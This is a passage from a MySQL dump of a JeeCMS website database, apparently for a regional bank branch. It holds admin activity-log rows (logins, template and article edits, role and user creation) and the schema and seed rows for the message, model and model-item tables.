'filename=/WEB-INF/t/cms/www/default/channel/news.html'), ('208', '1', '1', '3', '2018-10-22 17:59:29', '171.210.123.79', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/channel/news.html'), ('209', '1', '1', '3', '2018-10-22 18:01:15', '171.210.123.79', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/channel/news.html'), ('210', '1', '1', '3', '2018-10-22 18:01:29', '171.210.123.79', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/channel/news.html'), ('211', '1', '1', '3', '2018-10-22 18:01:56', '171.210.123.79', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/channel/news.html'), ('212', '1', '1', '3', '2018-10-22 18:02:09', '171.210.123.79', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/channel/news.html'), ('213', '1', '1', '3', '2018-10-22 18:04:09', '171.210.123.79', '/honghe/jeeadmin/jeecms/content/o_update.do', '修改文章', 'id=178;title=泸西支行重点组织各银行业金融机构开展防电信网络诈骗宣传活动'), ('214', '1', '1', '3', '2018-10-22 18:04:36', '171.210.123.79', '/honghe/jeeadmin/jeecms/content/o_update.do', '修改文章', 'id=173;title=石屏支行开展“加强信息保护和支付安全，防范电信网络诈骗”宣传活动'), ('215', '1', '1', '3', '2018-10-22 18:06:17', '171.210.123.79', '/honghe/jeeadmin/jeecms/content/o_update.do', '修改文章', 'id=182;title=红河中支完成公文结转'), ('216', '1', '1', '3', '2018-10-22 18:06:38', '171.210.123.79', '/honghe/jeeadmin/jeecms/content/o_update.do', '修改文章', 'id=182;title=红河中支完成公文结转'), ('217', '1', '1', '3', '2018-10-22 18:07:04', '171.210.123.79', '/honghe/jeeadmin/jeecms/content/o_update.do', '修改文章', 'id=181;title=关于统计支行科技检查项目中发现的问题的通知'), ('218', '1', '1', '3', '2018-10-22 18:07:20', '171.210.123.79', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/channel/news.html'), ('219', '1', '1', '3', '2018-10-22 18:07:37', '171.210.123.79', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/channel/news.html'), ('220', '1', '1', '3', '2018-10-22 18:08:33', '171.210.123.79', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/include/nav.html'), ('221', '1', '1', '3', '2018-10-22 18:18:12', '171.210.123.79', '/honghe/jeeadmin/jeecms/channel/o_update.do', '修改栏目', 'id=96;name=软件中心'), ('222', '1', '1', '3', '2018-10-22 18:21:23', '171.210.123.79', '/honghe/jeeadmin/jeecms/content/o_save.do', '增加文章', 'id=186;title=360安全浏览器 10.1'), ('223', '1', '1', '3', '2018-10-22 18:22:12', '171.210.123.79', '/honghe/jeeadmin/jeecms/content/o_save.do', '增加文章', 'id=187;title=爱奇艺影音 6.6'), ('224', '1', '1', '3', '2018-10-22 18:23:30', '171.210.123.79', '/honghe/jeeadmin/jeecms/content/o_save.do', '增加文章', 'id=188;title=PP助手 5.9.7'), ('225', '1', '1', '3', '2018-10-22 18:26:17', '171.210.123.79', '/honghe/jeeadmin/jeecms/content/o_update.do', '修改文章', 'id=188;title=PP助手 5.9.7'), ('226', '1', '1', '3', '2018-10-22 18:26:40', '171.210.123.79', '/honghe/jeeadmin/jeecms/content/o_update.do', '修改文章', 'id=187;title=爱奇艺影音 6.6'), ('227', '1', '1', '3', '2018-10-22 18:27:18', '171.210.123.79', '/honghe/jeeadmin/jeecms/content/o_save.do', '增加文章', 'id=189;title=QQ同步助手电脑版'), ('228', '1', null, '1', '2018-10-22 21:14:05', '110.184.80.250', '/honghe/jeeadmin/jeecms/login.do', 'login success', null), ('229', '1', null, '1', '2018-10-22 21:49:59', '110.184.80.250', '/honghe/jeeadmin/jeecms/login.do', 'login success', null), ('230', '1', null, '1', '2018-10-22 21:50:53', '110.184.80.250', '/honghe/jeeadmin/jeecms/login.do', 'login success', null), ('231', '1', null, '1', '2018-10-22 22:27:37', '39.128.162.98', '/honghe/jeeadmin/jeecms/login.do', 'login success', null), ('232', '1', null, '1', '2018-10-23 12:38:03', '39.128.162.98', '/honghe/jeeadmin/jeecms/login.do', 'login success', null), ('233', '1', null, '1', '2018-10-23 15:06:28', '39.128.162.98', '/honghe/jeeadmin/jeecms/login.do', 'login success', null), ('234', '1', '1', '3', '2018-10-23 15:07:57', '39.128.162.98', '/honghe/jeeadmin/jeecms/role/o_save.do', '增加角色', 'id=3;name=信息发布员'), ('235', '1', '1', '3', '2018-10-23 15:09:44', '39.128.162.98', '/honghe/jeeadmin/jeecms/admin_local/o_save.do', '增加用户', 'id=3;username=testuser'), ('236', '1', '1', '3', '2018-10-23 15:10:00', '39.128.162.98', '/honghe/jeeadmin/jeecms/department/o_update.do', '修改部门', 'id=1;name=中支'), ('237', '1', '1', '3', '2018-10-23 15:10:08', '39.128.162.98', '/honghe/jeeadmin/jeecms/department/o_update.do', '修改部门', 'id=2;name=科技科'), ('238', '1', '1', '3', '2018-10-23 15:10:23', '39.128.162.98', '/honghe/jeeadmin/jeecms/admin_local/o_update.do', '修改用户', 'id=3;username=testuser'), ('239', '3', null, '1', '2018-10-23 15:10:32', '39.128.162.98', '/honghe/jeeadmin/jeecms/login.do', 'login success', null), ('240', '1', null, '1', '2018-10-23 15:10:46', '39.128.162.98', '/honghe/jeeadmin/jeecms/login.do', 'login success', null), ('241', '1', '1', '3', '2018-10-23 15:12:42', '39.128.162.98', '/honghe/jeeadmin/jeecms/role/o_update.do', '修改角色', 'id=3;name=信息发布员'), ('242', '1', '1', '3', '2018-10-23 15:13:00', '39.128.162.98', '/honghe/jeeadmin/jeecms/role/o_save.do', '增加角色', 'id=4;name=信息审核角色'), ('243', '1', '1', '3', '2018-10-23 15:13:10', '39.128.162.98', '/honghe/jeeadmin/jeecms/role/o_update.do', '修改角色', 'id=3;name=信息发布角色'), ('244', '1', '1', '3', '2018-10-23 15:13:53', '39.128.162.98', '/honghe/jeeadmin/jeecms/admin_local/o_save.do', '增加用户', 'id=4;username=teststaff'), ('245', '1', '1', '3', '2018-10-23 15:14:02', '39.128.162.98', '/honghe/jeeadmin/jeecms/admin_local/o_update.do', '修改用户', 'id=3;username=testuser'), ('246', '1', '1', '3', '2018-10-23 16:59:38', '39.128.162.98', '/honghe/jeeadmin/jeecms/role/o_update.do', '修改角色', 'id=4;name=信息审核角色'), ('247', null, null, '2', '2018-10-23 16:59:47', '39.128.162.98', '/honghe/jeeadmin/jeecms/login.do', 'login failure', 'username=teststaff'), ('248', '4', null, '1', '2018-10-23 16:59:52', '39.128.162.98', '/honghe/jeeadmin/jeecms/login.do', 'login success', null), ('249', '1', null, '1', '2018-10-23 17:00:55', '39.128.162.98', '/honghe/jeeadmin/jeecms/login.do', 'login success', null), ('250', '1', '1', '3', '2018-10-23 17:02:52', '39.128.162.98', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html'), ('251', '1', '1', '3', '2018-10-23 17:03:05', '39.128.162.98', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/index/index.html'), ('252', '1', '1', '3', '2018-10-23 17:04:05', '39.128.162.98', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/include/footer.html'), ('253', '1', '1', '3', '2018-10-23 17:04:23', '39.128.162.98', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/include/footer.html'), ('254', '1', '1', '3', '2018-10-23 17:05:26', '39.128.162.98', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/include/footer.html'), ('255', '1', null, '1', '2018-10-23 18:05:08', '110.184.80.250', '/honghe/jeeadmin/jeecms/login.do', 'login success', null), ('256', '1', '1', '3', '2018-10-23 18:21:15', '110.184.80.250', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/include/footer.html'), ('257', '1', '1', '3', '2018-10-23 18:21:59', '110.184.80.250', '/honghe/jeeadmin/jeecms/template/o_ajaxUpdate.do', '修改模板', 'filename=/WEB-INF/t/cms/www/default/include/footer.html');
COMMIT;

-- ----------------------------
--  Table structure for `jc_message`
-- ----------------------------
DROP TABLE IF EXISTS `jc_message`;
CREATE TABLE `jc_message` (
  `msg_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '消息id',
  `msg_title` varchar(255) NOT NULL DEFAULT '' COMMENT '标题',
  `msg_content` longtext COMMENT '站内信息内容',
  `send_time` timestamp NULL DEFAULT NULL COMMENT '发送时间',
  `msg_send_user` int(11) NOT NULL DEFAULT '1' COMMENT '发信息人',
  `msg_receiver_user` int(11) NOT NULL DEFAULT '0' COMMENT '接收人',
  `site_id` int(11) NOT NULL DEFAULT '1' COMMENT '站点',
  `msg_status` tinyint(1) NOT NULL DEFAULT '0' COMMENT '消息状态0未读，1已读',
  `msg_box` int(2) NOT NULL DEFAULT '1' COMMENT '消息信箱 0收件箱 1发件箱 2草稿箱 3垃圾箱',
  PRIMARY KEY (`msg_id`),
  KEY `fk_jc_message_user_send` (`msg_send_user`),
  KEY `fk_jc_message_user_receiver` (`msg_receiver_user`),
  KEY `fk_jc_message_site` (`site_id`),
  CONSTRAINT `fk_jc_message_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_message_user_receiver` FOREIGN KEY (`msg_receiver_user`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_message_user_send` FOREIGN KEY (`msg_send_user`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='站内信';

-- ----------------------------
--  Table structure for `jc_model`
-- ----------------------------
DROP TABLE IF EXISTS `jc_model`;
CREATE TABLE `jc_model` (
  `model_id` int(11) NOT NULL,
  `model_name` varchar(100) NOT NULL COMMENT '名称',
  `model_path` varchar(100) NOT NULL COMMENT '路径',
  `tpl_channel_prefix` varchar(20) DEFAULT NULL COMMENT '栏目模板前缀',
  `tpl_content_prefix` varchar(20) DEFAULT NULL COMMENT '内容模板前缀',
  `title_img_width` int(11) NOT NULL DEFAULT '139' COMMENT '栏目标题图宽度',
  `title_img_height` int(11) NOT NULL DEFAULT '139' COMMENT '栏目标题图高度',
  `content_img_width` int(11) NOT NULL DEFAULT '310' COMMENT '栏目内容图宽度',
  `content_img_height` int(11) NOT NULL DEFAULT '310' COMMENT '栏目内容图高度',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `has_content` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否有内容',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `is_def` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否默认模型',
  `is_global` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否全站模型',
  `site_id` int(11) DEFAULT NULL COMMENT '非全站模型所属站点',
  PRIMARY KEY (`model_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS模型表';

-- ----------------------------
--  Records of `jc_model`
-- ----------------------------
BEGIN;
INSERT INTO `jc_model` VALUES ('1', '新闻', '1', 'news', 'news', '139', '139', '310', '310', '1', '1', '0', '1', '1', null), ('2', '单页', '2', 'alone', 'alone', '139', '139', '310', '310', '2', '0', '0', '0', '1', null), ('4', '下载', '4', 'download', 'download', '139', '139', '310', '310', '4', '1', '0', '0', '1', null), ('5', '图库', '5', 'pic', 'pic', '139', '139', '310', '310', '5', '1', '0', '0', '1', null), ('6', '视频', '6', 'video', 'video', '139', '139', '310', '310', '10', '1', '0', '0', '1', null), ('8', '招聘', 'job', 'job', 'job', '139', '139', '310', '310', '10', '1', '0', '0', '1', null), ('9', '文库', 'wenku', 'doc', 'doc', '139', '139', '310', '310', '10', '1', '0', '0', '1', null);
COMMIT;

-- ----------------------------
--  Table structure for `jc_model_item`
-- ----------------------------
DROP TABLE IF EXISTS `jc_model_item`;
CREATE TABLE `jc_model_item` (
  `modelitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `model_id` int(11) NOT NULL,
  `field` varchar(50) NOT NULL COMMENT '字段',
  `item_label` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '70' COMMENT '排列顺序',
  `def_value` varchar(255) DEFAULT NULL COMMENT '默认值',
  `opt_value` varchar(255) DEFAULT NULL COMMENT '可选项',
  `text_size` varchar(20) DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) NOT NULL DEFAULT '1' COMMENT '数据类型',
  `is_single` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否独占一行',
  `is_channel` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否栏目模型项',
  `is_custom` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否自定义',
  `is_display` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否显示',
  `is_required` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否必填项',
  `image_width` int(11) DEFAULT NULL COMMENT '图片宽度',
  `image_height` int(11) DEFAULT NULL COMMENT '图片宽度',
  PRIMARY KEY (`modelitem_id`),
  KEY `fk_jc_item_model` (`model_id`),
  CONSTRAINT `fk_jc_item_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`)
) ENGINE=InnoDB AUTO_INCREMENT=459 DEFAULT CHARSET=utf8 COMMENT='CMS模型项表';

-- ----------------------------
--  Records of `jc_model_item`
-- ----------------------------
BEGIN;
INSERT INTO `jc_model_item` VALUES ('1', '1', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('2', '1', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null), ('3', '1', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('4', '1', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null), ('5', '1', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('6', '1', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('7', '1', 'tplContent', '选择模型模板', '10', null, null, null, null, null, null, null, '6', '1', '1', '0', '1', '0', null, null), ('8', '1', 'channelStatic', '栏目静态化', '11', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('9', '1', 'contentStatic', '内容静态化', '11', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('10', '1', 'priority', '排列顺序', '11', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null), ('11', '1', 'display', '显示', '11', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('12', '1', 'docImg', '文档图片', '11', null, null, null, null, null, null, null, '8', '1', '1', '0', '1', '0', null, null), ('14', '1', 'afterCheck', '审核后', '12', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('15', '1', 'commentControl', '评论', '11', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('16', '1', 'allowUpdown', '顶踩', '11', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('17', '1', 'viewGroupIds', '浏览权限', '11', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null), ('18', '1', 'contriGroupIds', '投稿权限', '11', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null), ('20', '1', 'link', '外部链接', '11', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('21', '1', 'titleImg', '标题图', '11', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('23', '1', 'title', '标题', '9', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '1', null, null), ('24', '1', 'shortTitle', '简短标题', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('25', '1', 'titleColor', '标题颜色', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('26', '1', 'tagStr', 'Tag标签', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('27', '1', 'description', '摘要', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null), ('28', '1', 'author', '作者', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('29', '1', 'origin', '来源', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('30', '1', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null), ('31', '1', 'topLevel', '固顶级别', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('32', '1', 'releaseDate', '发布时间', '10', null, null, null, null, null, null, null, '5', '0', '0', '0', '1', '0', null, null), ('33', '1', 'typeId', '内容类型', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('34', '1', 'tplContent', '指定模板', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('35', '1', 'typeImg', '类型图', '11', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('36', '1', 'titleImg', '标题图', '11', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('37', '1', 'contentImg', '内容图', '11', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('38', '1', 'attachments', '附件', '11', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('39', '1', 'media', '多媒体', '11', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('40', '1', 'txt', '内容', '11', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null), ('42', '2', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('43', '2', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null), ('44', '2', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('45', '2', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null), ('46', '2', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('47', '2', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('48', '2', 'priority', '排列顺序', '10', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null), ('49', '2', 'display', '显示', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('51', '2', 'link', '外部链接', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('52', '2', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('53', '2', 'txt', '内容', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('93', '4', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('94', '4', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null), ('95', '4', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('96', '4', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null), ('97', '4', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('98', '4', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('99', '4', 'tplContent', '选择模型模板', '9', null, null, null, null, null, null, null, '6', '1', '1', '0', '1', '0', null, null), ('100', '4', 'priority', '排列顺序', '10', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null), ('101', '4', 'display', '显示', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('102', '4', 'docImg', '文档图片', '10', null, null, null, null, null, null, null, '8', '1', '1', '0', '1', '0', null, null), ('103', '4', 'commentControl', '评论', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('104', '4', 'allowUpdown', '顶踩', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('105', '4', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '1', '1', '0', '1', '0', null, null), ('107', '4', 'channelId', '栏目', '1', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '1', null, null), ('108', '4', 'title', '软件名称', '2', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '1', null, null), ('109', '4', 'shortTitle', '软件简称', '3', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('110', '4', 'titleColor', '标题颜色', '4', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('111', '4', 'description', '摘要', '5', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null), ('112', '4', 'author', '发布人', '6', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('113', '4', 'viewGroupIds', '浏览权限', '7', null, null, null, null, null, null, null, '7', '0', '0', '0', '1', '0', null, null), ('114', '4', 'topLevel', '固顶级别', '8', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('115', '4', 'releaseDate', '发布时间', '9', null, null, null, null, null, null, null, '5', '0', '0', '0', '1', '0', null, null), ('116', '4', 'typeId', '内容类型', '9', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('117', '4', 'tplContent', '指定模板', '22', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '0', null, null), ('118', '4', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('119', '4', 'attachments', '资源上传', '11', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('120', '4', 'txt', '软件介绍', '20', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null), ('121', '4', 'softType', '软件类型', '12', '国产软件', '国产软件,国外软件', '100', '3', '30', null, null, '6', '0', '0', '1', '1', '0', null, null), ('122', '4', 'warrant', '软件授权', '13', '免费版', '免费版,共享版', '', '3', '30', '', '', '6', '0', '0', '1', '1', '0', null, null), ('123', '4', 'relatedLink', '相关链接', '14', 'http://', '', '50', '3', '30', '', '', '1', '0', '0', '1', '1', '0', null, null), ('124', '4', 'demoUrl', '演示地址', '15', 'http://', null, '60', '3', '30', null, null, '1', '0', '0', '1', '1', '0', null, null), ('125', '5', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('126', '5', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null), ('127', '5', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('128', '5', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null), ('129', '5', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('130', '5', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('131', '5', 'tplContent', '选择模型模板', '10', null, null, null, null, null, null, null, '6', '1', '1', '0', '1', '0', null, null), ('132', '5', 'channelStatic', '栏目静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('133', '5', 'contentStatic', '内容静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('134', '5', 'priority', '排列顺序', '10', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null), ('135', '5', 'display', '显示', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('136', '5', 'docImg', '文档图片', '10', null, null, null, null, null, null, null, '8', '1', '1', '0', '1', '0', null, null), ('138', '5', 'afterCheck', '审核后', '11', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('139', '5', 'commentControl', '评论', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('140', '5', 'allowUpdown', '顶踩', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('141', '5', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null), ('142', '5', 'contriGroupIds', '投稿权限', '10', null, null, null, null, null, null, null, '7', '0', '1', '0', '1', '0', null, null), ('144', '5', 'link', '外部链接', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('145', '5', 'titleImg', '标题图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('146', '5', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '1', '0', '1', '0', null, null), ('147', '5', 'channelId', '栏目', '10', null, null, null, null, null, null, null, '6', '1', '0', '0', '1', '1', null, null), ('148', '5', 'title', '标题', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '1', null, null), ('149', '5', 'shortTitle', '简短标题', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('150', '5', 'titleColor', '标题颜色', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('151', '5', 'tagStr', 'Tag标签', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('152', '5', 'description', '摘要', '10', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null), ('153', '5', 'author', '作者', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('154', '5', 'origin', '来源', '10', null, null, null, null, null, null, null, '1', '0', '0', '0', '1', '0', null, null), ('155', '5', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '1', '0', '0', '1', '0', null, null), ('156', '5', 'topLevel', '固顶级别', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('157', '5', 'releaseDate', '发布时间', '10', null, null, null, null, null, null, null, '5', '0', '0', '0', '1', '0', null, null), ('158', '5', 'typeId', '内容类型', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('159', '5', 'tplContent', '指定模板', '10', null, null, null, null, null, null, null, '6', '0', '0', '0', '1', '0', null, null), ('160', '5', 'typeImg', '类型图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('161', '5', 'titleImg', '标题图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('162', '5', 'contentImg', '内容图', '10', null, null, null, null, null, null, null, '1', '1', '0', '0', '1', '0', null, null), ('163', '5', 'pictures', '图片集', '11', null, null, null, null, null, null, null, '4', '1', '0', '0', '1', '0', null, null), ('164', '6', 'name', '栏目名称', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('165', '6', 'path', '访问路径', '8', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '1', null, null), ('166', '6', 'title', 'meta标题', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '1', null, null), ('167', '6', 'keywords', 'meta关键字', '8', null, null, null, null, null, null, null, '1', '0', '1', '0', '1', '0', null, null), ('168', '6', 'description', 'meta描述', '8', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('169', '6', 'tplChannel', '栏目模板', '8', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('170', '6', 'tplContent', '选择模型模板', '10', null, null, null, null, null, null, null, '6', '1', '1', '0', '1', '0', null, null), ('171', '6', 'channelStatic', '栏目静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('172', '6', 'contentStatic', '内容静态化', '10', null, null, null, null, null, null, null, '4', '1', '1', '0', '1', '0', null, null), ('173', '6', 'priority', '排列顺序', '10', null, null, null, null, null, null, null, '2', '0', '1', '0', '1', '0', null, null), ('174', '6', 'display', '显示', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('175', '6', 'docImg', '文档图片', '10', null, null, null, null, null, null, null, '8', '1', '1', '0', '1', '0', null, null), ('177', '6', 'afterCheck', '审核后', '11', null, null, null, null, null, null, null, '6', '0', '1', '0', '1', '0', null, null), ('178', '6', 'commentControl', '评论', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('179', '6', 'allowUpdown', '顶踩', '10', null, null, null, null, null, null, null, '8', '0', '1', '0', '1', '0', null, null), ('180', '6', 'viewGroupIds', '浏览权限', '10', null, null, null, null, null, null, null, '7', '0', '1', 